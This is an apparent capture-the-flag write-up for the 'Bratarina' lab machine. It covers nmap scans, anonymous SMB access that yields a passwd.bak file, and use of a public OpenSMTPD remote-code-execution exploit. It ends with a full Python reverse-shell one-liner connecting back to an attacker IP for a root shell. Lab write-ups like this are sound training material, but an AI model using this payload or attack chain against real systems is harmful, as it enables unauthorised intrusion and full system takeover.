First Start with nmap scan

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Dec 30 19:37:34 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.71
Nmap scan report for 192.168.108.71
Host is up (0.20s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec 30 19:38:10 2022 -- 1 IP address (1 host up) scanned in 35.87 seconds
```

Now we know what ports are open, let's run default nmap scripts.

`nmap -sC -sV -oN normal.tcp -p 22,80,25,445 -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Dec 30 19:43:41 2022 as: nmap -sC -sV -oN normal.tcp -p 22,80,25,445 -Pn 192.168.108.71
Nmap scan report for 192.168.108.71                                                
Host is up (0.21s latency).                                                        
                                         
PORT    STATE SERVICE     VERSION                                                                                                                                     
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                     
|   2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)
|   256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)                         
|_  256 d55b795bce48d85746db594fcd455def (ED25519)                      
25/tcp  open  smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.108], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
80/tcp  open  http        nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                         
Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m14s, median: 0s
| smb2-security-mode:    
|   311:                      
|_    Message signing enabled but not required
| smb2-time:                                                                       
|   date: 2022-12-30T18:43:51
|_  start_date: N/A                     
| smb-security-mode:        
|   account_used: <blank>               
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)                                                                                                                              
|   Computer name: bratarina                                                                                                                                          
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00                                                              
|   FQDN: bratarina
|_  System time: 2022-12-30T13:43:52-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 30 19:44:30 2022 -- 1 IP address (1 host up) scanned in 49.74 seconds
```

Now we know what services are running on those ports, let with port 80 (http).

![image](https://user-images.githubusercontent.com/87468669/211330775-c20a399f-1084-4702-a38e-d026633081a9.png)

Checked the webservice, part of the page is returning 404. as we can see it is also running `FlaskBB`. After searching online, did dir bursting and got nothing, i moved to smb port.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Bratarina]
└─$ smbclient -L 192.168.186.71 -N       
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backups         Disk      Share for backups
        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.186.71 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Bratarina]
└─$ smbclient //192.168.186.71/backups -N 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  6 08:46:41 2020
  ..                                  D        0  Mon Jul  6 08:46:41 2020
  passwd.bak                          N     1747  Mon Jul  6 08:46:41 2020

                10253588 blocks of size 1024. 6355356 blocks available
smb: \> get passwd.bak 
getting file \passwd.bak of size 1747 as passwd.bak (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \> put normal.tcp 
NT_STATUS_ACCESS_DENIED opening remote file \normal.tcp
smb: \>
```

anonymous smb login is allowed to the backups share, got a file `passwd.bak` downloaded the file.Tried to upload a file but we dont have permission for that. let's check the file content.

![image](https://user-images.githubusercontent.com/87468669/211336694-a29a0839-a004-42a1-b406-3cdb7ca92d0e.png)

The content f passwd.bak is the `/etc/passwd` file, tried bruteforcing ssh password with user neil did not get the password. let's move to port 25 (OpenSMTP).

![image](https://user-images.githubusercontent.com/87468669/211338283-c858390b-6a95-4529-ac67-0f2763c0d00b.png)

i did some research on exploiting `Opensmtp`, i stumbled on an RCE exploit. Basically what this exploit does is send a malicious cmd get payload to root through smtp which will give use RCE. let's download the exploit.

![image](https://user-images.githubusercontent.com/87468669/211339685-05a7b8ae-c75b-40c1-9c3d-72fa8be8ed1c.png)

running the exploit and putting a reverse shell payload got a reverse shell as user root.
revshell payload:
```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.186\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```













